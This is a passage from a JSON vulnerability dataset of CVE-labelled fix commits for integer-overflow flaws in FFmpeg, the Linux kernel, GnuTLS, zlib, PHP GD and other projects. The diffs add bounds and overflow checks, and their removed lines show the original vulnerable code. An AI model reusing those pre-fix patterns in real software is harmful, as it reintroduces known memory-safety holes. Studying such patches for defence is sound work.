b\/ssl\/ssl_err.c\nindex 1a6030e623..202228b48d 100644\n--- a\/ssl\/ssl_err.c\n+++ b\/ssl\/ssl_err.c\n@@ -386,8 +386,11 @@ static ERR_STRING_DATA SSL_str_reasons[] = {\n      \"bad data returned by callback\"},\n     {ERR_REASON(SSL_R_BAD_DECOMPRESSION), \"bad decompression\"},\n     {ERR_REASON(SSL_R_BAD_DH_G_LENGTH), \"bad dh g length\"},\n+    {ERR_REASON(SSL_R_BAD_DH_G_VALUE), \"bad dh g value\"},\n     {ERR_REASON(SSL_R_BAD_DH_PUB_KEY_LENGTH), \"bad dh pub key length\"},\n+    {ERR_REASON(SSL_R_BAD_DH_PUB_KEY_VALUE), \"bad dh pub key value\"},\n     {ERR_REASON(SSL_R_BAD_DH_P_LENGTH), \"bad dh p length\"},\n+    {ERR_REASON(SSL_R_BAD_DH_P_VALUE), \"bad dh p value\"},\n     {ERR_REASON(SSL_R_BAD_DIGEST_LENGTH), \"bad digest length\"},\n     {ERR_REASON(SSL_R_BAD_DSA_SIGNATURE), \"bad dsa signature\"},\n     {ERR_REASON(SSL_R_BAD_ECC_CERT), \"bad ecc cert\"},\n-- \n2.17.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-0862","CWE_ID":"189","category":"security","commit_id":"f4fb841ad13bab66d4fb0c7ff2a94770df7815d8","commit_message":"From f4fb841ad13bab66d4fb0c7ff2a94770df7815d8 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Tue, 22 Jan 2013 21:30:20 +0100\nSubject: [PATCH] sanm: check image dimensions before using them\n\nAvoids integer overflows and out of array accesses.\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n(cherry picked from commit 49b729d3af8464de431362e6c5b3027102bc2f88)\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/sanm.c | 8 ++++++--\n 1 file changed, 6 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/sanm.c b\/libavcodec\/sanm.c\nindex 7432fa273f..ff70f206e6 100644\n--- a\/libavcodec\/sanm.c\n+++ b\/libavcodec\/sanm.c\n@@ -26,6 +26,7 @@\n #include \"bytestream.h\"\n #include \"internal.h\"\n #include \"libavutil\/bswap.h\"\n+#include \"libavutil\/imgutils.h\"\n #include \"libavcodec\/dsputil.h\"\n #include \"sanm_data.h\"\n \n@@ -716,8 +717,11 @@ static int process_frame_obj(SANMVideoContext *ctx)\n     h     = bytestream2_get_le16u(&ctx->gb);\n \n     if (ctx->width < left + w || ctx->height < top + h) {\n-        ctx->avctx->width  = FFMAX(left + w, ctx->width);\n-        ctx->avctx->height = FFMAX(top + h, ctx->height);\n+        if (av_image_check_size(FFMAX(left + w, ctx->width),\n+                                FFMAX(top  + h, ctx->height), 0, ctx->avctx) < 0)\n+            return AVERROR_INVALIDDATA;\n+        avcodec_set_dimensions(ctx->avctx, FFMAX(left + w, ctx->width),\n+                                           FFMAX(top  + h, ctx->height));\n         init_sizes(ctx, left + w, top + h);\n         if (init_buffers(ctx)) {\n             av_log(ctx->avctx, AV_LOG_ERROR, \"error resizing buffers\\n\");\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-3974","CWE_ID":"189","category":"security","commit_id":"bd968d260aef322fb32e254a3de0d2036c57bd56","commit_message":"From bd968d260aef322fb32e254a3de0d2036c57bd56 Mon Sep 17 00:00:00 2001\nFrom: Mans Rullgard <mans@mansr.com>\nDate: Wed, 10 Aug 2011 18:52:11 +0100\nSubject: [PATCH] cavs: fix some crashes with invalid bitstreams\n\nThis removes all valgrind-reported invalid writes with one\nspecific test file.\n\nFixes http:\/\/www.ocert.org\/advisories\/ocert-2011-002.html\n\nSigned-off-by: Mans Rullgard <mans@mansr.com>\n(cherry picked from commit 4a71da0f3ab7f5542decd11c81994f849d5b2c78)\n---\n libavcodec\/cavsdec.c | 11 ++++++++---\n 1 file changed, 8 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/cavsdec.c b\/libavcodec\/cavsdec.c\nindex a9e4d37c2a..35c37d0768 100644\n--- a\/libavcodec\/cavsdec.c\n+++ b\/libavcodec\/cavsdec.c\n@@ -130,12 +130,14 @@ static int decode_residual_block(AVSContext *h, GetBitContext *gb,\n                 r++;\n             mask = -(level_code & 1);\n             level = (level^mask) - mask;\n-        } else {\n+        } else if (level_code >= 0) {\n             level = r->rltab[level_code][0];\n             if(!level) \/\/end of block signal\n                 break;\n             run   = r->rltab[level_code][1];\n             r += r->rltab[level_code][2];\n+        } else {\n+            break;\n         }\n         level_buf[i] = level;\n         run_buf[i] = run;\n@@ -189,7 +191,8 @@ static inline int decode_residual_inter(AVSContext *h) {\n \n static int decode_mb_i(AVSContext *h, int cbp_code) {\n     GetBitContext *gb = &h->s.gb;\n-    int block, pred_mode_uv;\n+    unsigned pred_mode_uv;\n+    int block;\n     uint8_t top[18];\n     uint8_t *left = NULL;\n     uint8_t *d;\n@@ -445,6 +448,8 @@ static inline int check_for_slice(AVSContext *h) {\n     if((show_bits_long(gb,24+align) & 0xFFFFFF) == 0x000001) {\n         skip_bits_long(gb,24+align);\n         h->stc = get_bits(gb,8);\n+        if (h->stc >= h->mb_height)\n+            return 0;\n         decode_slice_header(h,gb);\n         return 1;\n     }\n@@ -659,7 +664,7 @@ static int cavs_decode_frame(AVCodecContext * avctx,void *data, int *data_size,\n     buf_end = buf + buf_size;\n     for(;;) {\n         buf_ptr = ff_find_start_code(buf_ptr,buf_end, &stc);\n-        if(stc & 0xFFFFFE00)\n+        if((stc & 0xFFFFFE00) || buf_ptr == buf_end)\n             return FFMAX(0, buf_ptr - buf - s->parse_context.last_index);\n         input_size = (buf_end - buf_ptr)*8;\n         switch(stc) {\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-2384","CWE_ID":"189","category":"security","commit_id":"44afb3a04391a74309d16180d1e4f8386fdfa745","commit_message":"From 44afb3a04391a74309d16180d1e4f8386fdfa745 Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Mon, 23 Apr 2012 04:06:42 -0400\nSubject: [PATCH] drm\/i915: fix integer overflow in i915_gem_do_execbuffer()\n\nOn 32-bit systems, a large args->num_cliprects from userspace via ioctl\nmay overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 432e58ed (\"drm\/i915: Avoid\nallocation for execbuffer object list\").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Chris Wilson <chris@chris-wilson.co.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>\n---\n drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n","diff_code":"diff --git a\/drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c b\/drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c\nindex 7c50e58175c02..de431942ded4b 100644\n--- a\/drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c\n+++ b\/drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c\n@@ -1133,6 +1133,11 @@ i915_gem_do_execbuffer(struct drm_device *dev, void *data,\n \t\t\treturn -EINVAL;\n \t\t}\n \n+\t\tif (args->num_cliprects > UINT_MAX \/ sizeof(*cliprects)) {\n+\t\t\tDRM_DEBUG(\"execbuf with %u cliprects\\n\",\n+\t\t\t\t  args->num_cliprects);\n+\t\t\treturn -EINVAL;\n+\t\t}\n \t\tcliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n \t\t\t\t    GFP_KERNEL);\n \t\tif (cliprects == NULL) {\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-4563","CWE_ID":"189","category":"security","commit_id":"0e033e04c2678dbbe74a46b23fffb7bb918c288e","commit_message":"From 0e033e04c2678dbbe74a46b23fffb7bb918c288e Mon Sep 17 00:00:00 2001\nFrom: Hannes Frederic Sowa <hannes@stressinduktion.org>\nDate: Tue, 5 Nov 2013 02:41:27 +0100\nSubject: [PATCH] ipv6: fix headroom calculation in udp6_ufo_fragment\n\nCommit 1e2bd517c108816220f262d7954b697af03b5f9c (\"udp6: Fix udp\nfragmentation for tunnel traffic.\") changed the calculation if\nthere is enough space to include a fragment header in the skb from a\nskb->mac_header dervived one to skb_headroom. Because we already peeled\noff the skb to transport_header this is wrong. Change this back to check\nif we have enough room before the mac_header.\n\nThis fixes a panic Saran Neti reported. He used the tbf scheduler which\nskb_gso_segments the skb. The offsets get negative and we panic in memcpy\nbecause the skb was erroneously not expanded at the head.\n\nReported-by: Saran Neti <Saran.Neti@telus.com>\nCc: Pravin B Shelar <pshelar@nicira.com>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ipv6\/udp_offload.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/ipv6\/udp_offload.c b\/net\/ipv6\/udp_offload.c\nindex 08e23b0bf302e..e7359f9eaa8d4 100644\n--- a\/net\/ipv6\/udp_offload.c\n+++ b\/net\/ipv6\/udp_offload.c\n@@ -90,7 +90,7 @@ static struct sk_buff *udp6_ufo_fragment(struct sk_buff *skb,\n \n \t\t\/* Check if there is enough headroom to insert fragment header. *\/\n \t\ttnl_hlen = skb_tnl_header_len(skb);\n-\t\tif (skb_headroom(skb) < (tnl_hlen + frag_hdr_sz)) {\n+\t\tif (skb->mac_header < (tnl_hlen + frag_hdr_sz)) {\n \t\t\tif (gso_pskb_expand_head(skb, tnl_hlen + frag_hdr_sz))\n \t\t\t\tgoto out;\n \t\t}\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-2370","CWE_ID":"189","category":"security","commit_id":"4f0f465f991cd454d03189497f923eb40c170c22","commit_message":"From 4f0f465f991cd454d03189497f923eb40c170c22 Mon Sep 17 00:00:00 2001\nFrom: Matthias Clasen <mclasen@redhat.com>\nDate: Sat, 14 Apr 2012 14:21:09 -0400\nSubject: [PATCH] Avoid an integer overflow in the xbm loader\n\nAt the same time, reject some silly input, such as negative\nwidth or height.\n\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=672811\n---\n gdk-pixbuf\/io-xbm.c | 12 ++++++++++--\n 1 file changed, 10 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/gdk-pixbuf\/io-xbm.c b\/gdk-pixbuf\/io-xbm.c\nindex 46653b906..4f3e1e8bd 100644\n--- a\/gdk-pixbuf\/io-xbm.c\n+++ b\/gdk-pixbuf\/io-xbm.c\n@@ -183,10 +183,16 @@ read_bitmap_file_data (FILE    *fstream,\n \t\t\t\ttype++;\n \t\t\t}\n \n-\t\t\tif (!strcmp (\"width\", type))\n+\t\t\tif (!strcmp (\"width\", type)) {\n+                                if (value <= 0)\n+                                        RETURN (FALSE);\n \t\t\t\tww = (unsigned int) value;\n-\t\t\tif (!strcmp (\"height\", type))\n+                        }\n+\t\t\tif (!strcmp (\"height\", type)) {\n+                                if (value <= 0)\n+                                        RETURN (FALSE);\n \t\t\t\thh = (unsigned int) value;\n+                        }\n \t\t\tif (!strcmp (\"hot\", type)) {\n \t\t\t\tif (type-- == name_and_type\n \t\t\t\t    || type-- == name_and_type)\n@@ -231,6 +237,8 @@ read_bitmap_file_data (FILE    *fstream,\n \t\tbytes_per_line = (ww+7)\/8 + padding;\n \n \t\tsize = bytes_per_line * hh;\n+                if (size \/ bytes_per_line != hh) \/* overflow *\/\n+                        RETURN (FALSE);\n \t\tbits = g_malloc (size);\n \n \t\tif (version10p) {\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-3468","CWE_ID":"189","category":"security","commit_id":"1c3ccb3e040bf13e342ee60bc23b21b97b11923f","commit_message":"From 1c3ccb3e040bf13e342ee60bc23b21b97b11923f Mon Sep 17 00:00:00 2001\nFrom: Nikos Mavrogiannopoulos <nmav@gnutls.org>\nDate: Fri, 16 May 2014 22:10:08 +0200\nSubject: Do not return illegal values in asn1_get_bit_der().\n\n---\n lib\/decoding.c | 7 +++++--\n 1 file changed, 5 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/lib\/decoding.c b\/lib\/decoding.c\nindex 7e0ed05..894be79 100644\n--- a\/lib\/decoding.c\n+++ b\/lib\/decoding.c\n@@ -249,7 +249,7 @@ asn1_get_octet_der (const unsigned char *der, int der_len,\n \t\t    int *ret_len, unsigned char *str, int str_size,\n \t\t    int *str_len)\n {\n-  int len_len;\n+  int len_len = 0;\n \n   if (der_len <= 0)\n     return ASN1_GENERIC_ERROR;\n@@ -371,7 +371,7 @@ asn1_get_bit_der (const unsigned char *der, int der_len,\n \t\t  int *ret_len, unsigned char *str, int str_size,\n \t\t  int *bit_len)\n {\n-  int len_len, len_byte;\n+  int len_len = 0, len_byte;\n \n   if (der_len <= 0)\n     return ASN1_GENERIC_ERROR;\n@@ -381,6 +381,9 @@ asn1_get_bit_der (const unsigned char *der, int der_len,\n \n   *ret_len = len_byte + len_len + 1;\n   *bit_len = len_byte * 8 - der[len_len];\n+  \n+  if (*bit_len <= 0)\n+    return ASN1_DER_ERROR;\n \n   if (str_size >= len_byte)\n     memcpy (str, der + len_len + 1, len_byte);\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2008-1949","CWE_ID":"189","category":"security","commit_id":"bc8102405fda11ea00ca3b42acc4f4bce9d6e97b","commit_message":"From bc8102405fda11ea00ca3b42acc4f4bce9d6e97b Mon Sep 17 00:00:00 2001\nFrom: Simon Josefsson <simon@josefsson.org>\nDate: Mon, 19 May 2008 10:34:08 +0200\nSubject: [PATCH] Fix GNUTLS-SA-2008-1 security vulnerabilities. See\n http:\/\/www.gnu.org\/software\/gnutls\/security.html for updates.\n\n---\n lib\/ext_server_name.c  | 27 ++++++++++++++++++++-------\n lib\/gnutls_cipher.c    | 14 +++++++++++---\n lib\/gnutls_handshake.c |  8 ++++++++\n 3 files changed, 39 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/lib\/ext_server_name.c b\/lib\/ext_server_name.c\nindex 72e42ff..a2db949 100644\n--- a\/lib\/ext_server_name.c\n+++ b\/lib\/ext_server_name.c\n@@ -74,10 +74,27 @@ _gnutls_server_name_recv_params (gnutls_session_t session,\n \t  len = _gnutls_read_uint16 (p);\n \t  p += 2;\n \n-\t  DECR_LENGTH_RET (data_size, len, 0);\n-\t  server_names++;\n+\t  if (len > 0)\n+\t    {\n+\t      DECR_LENGTH_RET (data_size, len, 0);\n+\t      server_names++;\n+\t      p += len;\n+\t    }\n+\t  else\n+\t    _gnutls_handshake_log\n+\t      (\"HSK[%x]: Received zero size server name (under attack?)\\n\",\n+\t       session);\n \n-\t  p += len;\n+\t}\n+\n+      \/* we cannot accept more server names.\n+       *\/\n+      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n+\t{\n+\t  _gnutls_handshake_log\n+\t    (\"HSK[%x]: Too many server names received (under attack?)\\n\",\n+\t     session);\n+\t  server_names = MAX_SERVER_NAME_EXTENSIONS;\n \t}\n \n       session->security_parameters.extensions.server_names_size =\n@@ -85,10 +102,6 @@ _gnutls_server_name_recv_params (gnutls_session_t session,\n       if (server_names == 0)\n \treturn 0;\t\t\/* no names found *\/\n \n-      \/* we cannot accept more server names.\n-       *\/\n-      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n-\tserver_names = MAX_SERVER_NAME_EXTENSIONS;\n \n       p = data + 2;\n       for (i = 0; i < server_names; i++)\ndiff --git a\/lib\/gnutls_cipher.c b\/lib\/gnutls_cipher.c\nindex ad192f4..778402a 100644\n--- a\/lib\/gnutls_cipher.c\n+++ b\/lib\/gnutls_cipher.c\n@@ -459,6 +459,14 @@ _gnutls_ciphertext2compressed (gnutls_session_t session,\n       return GNUTLS_E_INTERNAL_ERROR;\n     }\n \n+  if (ciphertext.size < (unsigned) blocksize + hash_size)\n+    {\n+      _gnutls_record_log\n+\t(\"REC[%x]: Short record length %d < %d + %d (under attack?)\\n\",\n+\t session, ciphertext.size, blocksize, hash_size);\n+      gnutls_assert ();\n+      return GNUTLS_E_DECRYPTION_FAILED;\n+    }\n \n   \/* actual decryption (inplace)\n    *\/\n@@ -510,9 +518,7 @@ _gnutls_ciphertext2compressed (gnutls_session_t session,\n \n       pad = ciphertext.data[ciphertext.size - 1] + 1;\t\/* pad *\/\n \n-      length = ciphertext.size - hash_size - pad;\n-\n-      if (pad > ciphertext.size - hash_size)\n+      if ((int)pad > (int)ciphertext.size - hash_size)\n \t{\n \t  gnutls_assert ();\n \t  \/* We do not fail here. We check below for the\n@@ -521,6 +527,8 @@ _gnutls_ciphertext2compressed (gnutls_session_t session,\n \t  pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n \t}\n \n+      length = ciphertext.size - hash_size - pad;\n+\n       \/* Check the pading bytes (TLS 1.x)\n        *\/\n       if (ver >= GNUTLS_TLS1 && pad_failed == 0)\ndiff --git a\/lib\/gnutls_handshake.c b\/lib\/gnutls_handshake.c\nindex 4ab6db6..d798180 100644\n--- a\/lib\/gnutls_handshake.c\n+++ b\/lib\/gnutls_handshake.c\n@@ -1003,6 +1003,14 @@ _gnutls_recv_handshake_header (gnutls_session_t session,\n \n       *recv_type = session->internals.handshake_header_buffer.recv_type;\n \n+      if (*recv_type != type)\n+\t{\n+\t  gnutls_assert ();\n+\t  _gnutls_handshake_log\n+\t    (\"HSK[%x]: Handshake type mismatch (under attack?)\\n\", session);\n+\t  return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;\n+\t}\n+\n       return session->internals.handshake_header_buffer.packet_length;\n     }\n \n-- \n1.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-3228","CWE_ID":"189","category":"security","commit_id":"0c0b0859ae1aba64861599f0e7f74f143f305932","commit_message":"From 0c0b0859ae1aba64861599f0e7f74f143f305932 Mon Sep 17 00:00:00 2001\nFrom: Chris Liddell <chris.liddell@artifex.com>\nDate: Tue, 7 Jul 2015 16:57:41 +0100\nSubject: [PATCH] Bug 696041: sanity check for memory allocation.\n\nIn gs_heap_alloc_bytes(), add a sanity check to ensure we don't overflow the\nvariable holding the actual number of bytes we allocate.\n\nNo cluster differences\n---\n gs\/base\/gsmalloc.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/gs\/base\/gsmalloc.c b\/gs\/base\/gsmalloc.c\nindex 624552d..cad79c2 100644\n--- a\/gs\/base\/gsmalloc.c\n+++ b\/gs\/base\/gsmalloc.c\n@@ -178,7 +178,7 @@ gs_heap_alloc_bytes(gs_memory_t * mem, uint size, client_name_t cname)\n     } else {\n         uint added = size + sizeof(gs_malloc_block_t);\n \n-        if (mmem->limit - added < mmem->used)\n+        if (added <= size || mmem->limit - added < mmem->used)\n             set_msg(\"exceeded limit\");\n         else if ((ptr = (byte *) Memento_label(malloc(added), cname)) == 0)\n             set_msg(\"failed\");\n-- \n2.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-2673","CWE_ID":"189","category":"security","commit_id":"be9df82919960214ee4b9d3313523bff44fd99e1","commit_message":"From be9df82919960214ee4b9d3313523bff44fd99e1 Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Thu, 15 Mar 2012 04:55:08 +0800\nSubject: [PATCH] Fix allocation size overflows due to rounding.\n\n* malloc.c (GC_generic_malloc): Check if the allocation size is\nrounded to a smaller value.\n* mallocx.c (GC_generic_malloc_ignore_off_page): Likewise.\n---\n malloc.c  | 2 ++\n mallocx.c | 2 ++\n 2 files changed, 4 insertions(+)\n\n","diff_code":"diff --git a\/malloc.c b\/malloc.c\nindex cc0cc001..899d6ff1 100644\n--- a\/malloc.c\n+++ b\/malloc.c\n@@ -169,6 +169,8 @@ GC_API void * GC_CALL GC_generic_malloc(size_t lb, int k)\n         GC_bool init;\n         lg = ROUNDED_UP_GRANULES(lb);\n         lb_rounded = GRANULES_TO_BYTES(lg);\n+        if (lb_rounded < lb)\n+            return((*GC_get_oom_fn())(lb));\n         n_blocks = OBJ_SZ_TO_BLOCKS(lb_rounded);\n         init = GC_obj_kinds[k].ok_init;\n         LOCK();\ndiff --git a\/mallocx.c b\/mallocx.c\nindex 2c79f41b..0d9c0a6c 100644\n--- a\/mallocx.c\n+++ b\/mallocx.c\n@@ -182,6 +182,8 @@ GC_INNER void * GC_generic_malloc_ignore_off_page(size_t lb, int k)\n         return(GC_generic_malloc((word)lb, k));\n     lg = ROUNDED_UP_GRANULES(lb);\n     lb_rounded = GRANULES_TO_BYTES(lg);\n+    if (lb_rounded < lb)\n+        return((*GC_get_oom_fn())(lb));\n     n_blocks = OBJ_SZ_TO_BLOCKS(lb_rounded);\n     init = GC_obj_kinds[k].ok_init;\n     if (EXPECT(GC_have_errors, FALSE))\n","owner":"ivmai","repo":"bdwgc","source":"cve"},{"CVE_ID":"CVE-2014-2972","CWE_ID":"189","category":"security","commit_id":"7685ce68148a083d7759e78d01aa5198fc099c44","commit_message":"From 7685ce68148a083d7759e78d01aa5198fc099c44 Mon Sep 17 00:00:00 2001\nFrom: Tony Finch <dot@dotat.at>\nDate: Wed, 16 Jul 2014 06:13:39 -0700\nSubject: [PATCH] Only expand integers for integer math once\n\n---\n src\/src\/expand.c | 31 ++++++++++++++++++++++++++++---\n 1 file changed, 28 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/src\/src\/expand.c b\/src\/src\/expand.c\nindex 88a5ee3..c6356fb 100644\n--- a\/src\/src\/expand.c\n+++ b\/src\/src\/expand.c\n@@ -14,6 +14,7 @@\n \/* Recursively called function *\/\n \n static uschar *expand_string_internal(uschar *, BOOL, uschar **, BOOL, BOOL, BOOL *);\n+static int_eximarith_t expanded_string_integer(uschar *, BOOL);\n \n #ifdef STAND_ALONE\n #ifndef SUPPORT_CRYPTEQ\n@@ -2445,7 +2446,7 @@ switch(cond_type)\n         }\n       else\n         {\n-        num[i] = expand_string_integer(sub[i], FALSE);\n+        num[i] = expanded_string_integer(sub[i], FALSE);\n         if (expand_string_message != NULL) return NULL;\n         }\n       }\n@@ -6679,7 +6680,7 @@ while (*s != 0)\n         int_eximarith_t max;\n         uschar *s;\n \n-        max = expand_string_integer(sub, TRUE);\n+        max = expanded_string_integer(sub, TRUE);\n         if (expand_string_message != NULL)\n           goto EXPAND_FAILED;\n         s = string_sprintf(\"%d\", vaguely_random_number((int)max));\n@@ -6879,8 +6880,32 @@ Returns:  the integer value, or\n int_eximarith_t\n expand_string_integer(uschar *string, BOOL isplus)\n {\n+return expanded_string_integer(expand_string(string), isplus);\n+}\n+\n+\n+\/*************************************************\n+ *         Interpret string as an integer        *\n+ *************************************************\/\n+\n+\/* Convert a string (that has already been expanded) into an integer.\n+\n+This function is used inside the expansion code.\n+\n+Arguments:\n+  s       the string to be expanded\n+  isplus  TRUE if a non-negative number is expected\n+\n+Returns:  the integer value, or\n+          -1 if string is NULL (which implies an expansion error)\n+          -2 for an integer interpretation error\n+          expand_string_message is set NULL for an OK integer\n+*\/\n+\n+static int_eximarith_t\n+expanded_string_integer(uschar *s, BOOL isplus)\n+{\n int_eximarith_t value;\n-uschar *s = expand_string(string);\n uschar *msg = US\"invalid integer \\\"%s\\\"\";\n uschar *endptr;\n \n-- \n1.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-9842","CWE_ID":"189","category":"security","commit_id":"e54e1299404101a5a9d0cf5e45512b543967f958","commit_message":"From e54e1299404101a5a9d0cf5e45512b543967f958 Mon Sep 17 00:00:00 2001\nFrom: Mark Adler <madler@alumni.caltech.edu>\nDate: Sat, 5 Sep 2015 17:45:55 -0700\nSubject: [PATCH] Avoid shifts of negative values inflateMark().\n\nThe C standard says that bit shifts of negative integers is\nundefined.  This casts to unsigned values to assure a known\nresult.\n---\n inflate.c | 5 +++--\n 1 file changed, 3 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/inflate.c b\/inflate.c\nindex 2889e3a0..a7184167 100644\n--- a\/inflate.c\n+++ b\/inflate.c\n@@ -1506,9 +1506,10 @@ z_streamp strm;\n {\n     struct inflate_state FAR *state;\n \n-    if (strm == Z_NULL || strm->state == Z_NULL) return -1L << 16;\n+    if (strm == Z_NULL || strm->state == Z_NULL)\n+        return (long)(((unsigned long)0 - 1) << 16);\n     state = (struct inflate_state FAR *)strm->state;\n-    return ((long)(state->back) << 16) +\n+    return (long)(((unsigned long)((long)state->back)) << 16) +\n         (state->mode == COPY ? state->length :\n             (state->mode == MATCH ? state->was - state->length : 0));\n }\n","owner":"madler","repo":"zlib","source":"cve"},{"CVE_ID":"CVE-2014-2020","CWE_ID":"189","category":"security","commit_id":"2938329ce19cb8c4197dec146c3ec887c6f61d01","commit_message":"From 2938329ce19cb8c4197dec146c3ec887c6f61d01 Mon Sep 17 00:00:00 2001\nFrom: Xinchen Hui <laruence@php.net>\nDate: Fri, 27 Dec 2013 14:04:59 +0800\nSubject: [PATCH] Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop())\n\nAnd also fixed the bug: arguments are altered after some calls\n---\n NEWS                       |   1 +\n ext\/gd\/gd.c                | 181 ++++++++++++++++++++++++++++++-------\n ext\/gd\/tests\/bug66356.phpt |  22 +++++\n main\/php_version.h         |   6 +-\n 4 files changed, 173 insertions(+), 37 deletions(-)\n create mode 100644 ext\/gd\/tests\/bug66356.phpt\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex eecd4e800284..86eeb7cea9fe 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -29,6 +29,7 @@ PHP                                                                        NEWS\n   . Fixed bug #66229 (128.0.0.0\/16 isn't reserved any longer). (Adam)\n \n - GD:\n+  . Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop()). (Laruence)\n   . Fixed bug #64405 (Use freetype-config for determining freetype2 dir(s)).\n     (Adam)\n     \ndiff --git a\/ext\/gd\/gd.c b\/ext\/gd\/gd.c\nindex fb258214a153..49970c168838 100644\n--- a\/ext\/gd\/gd.c\n+++ b\/ext\/gd\/gd.c\n@@ -1538,9 +1538,15 @@ PHP_FUNCTION(imagesetstyle)\n \t\t\tbreak;\n \t\t}\n \n-\t\tconvert_to_long_ex(item);\n-\n-\t\tstylearr[index++] = Z_LVAL_PP(item);\n+\t\tif (Z_TYPE_PP(item) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **item;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\tstylearr[index++] = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\tstylearr[index++] = Z_LVAL_PP(item);\n+\t\t}\n \t}\n \n \tgdImageSetStyle(im, stylearr, index);\n@@ -3346,14 +3352,26 @@ static void php_imagepolygon(INTERNAL_FUNCTION_PARAMETERS, int filled)\n \n \tfor (i = 0; i < npoints; i++) {\n \t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2), (void **) &var) == SUCCESS) {\n-\t\t\tSEPARATE_ZVAL((var));\n-\t\t\tconvert_to_long(*var);\n-\t\t\tpoints[i].x = Z_LVAL_PP(var);\n+\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **var;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\tpoints[i].x = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\tpoints[i].x = Z_LVAL_PP(var);\n+\t\t\t}\n \t\t}\n \t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2) + 1, (void **) &var) == SUCCESS) {\n-\t\t\tSEPARATE_ZVAL(var);\n-\t\t\tconvert_to_long(*var);\n-\t\t\tpoints[i].y = Z_LVAL_PP(var);\n+\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **var;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\tpoints[i].y = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\tpoints[i].y = Z_LVAL_PP(var);\n+\t\t\t}\n \t\t}\n \t}\n \n@@ -4859,9 +4877,15 @@ PHP_FUNCTION(imageconvolution)\n \n \t\t\tfor (j=0; j<3; j++) {\n \t\t\t\tif (zend_hash_index_find(Z_ARRVAL_PP(var), (j), (void **) &var2) == SUCCESS) {\n-\t\t\t\t\tSEPARATE_ZVAL(var2);\n-\t\t\t\t\tconvert_to_double(*var2);\n-\t\t\t\t\tmatrix[i][j] = (float)Z_DVAL_PP(var2);\n+\t\t\t\t\tif (Z_TYPE_PP(var2) != IS_DOUBLE) {\n+\t\t\t\t\t\tzval dval;\n+\t\t\t\t\t\tdval = **var;\n+\t\t\t\t\t\tzval_copy_ctor(&dval);\n+\t\t\t\t\t\tconvert_to_double(&dval);\n+\t\t\t\t\t\tmatrix[i][j] = (float)Z_DVAL(dval);\n+\t\t\t\t\t} else {\n+\t\t\t\t\t\tmatrix[i][j] = (float)Z_DVAL_PP(var2);\n+\t\t\t\t\t}\n \t\t\t\t} else {\n 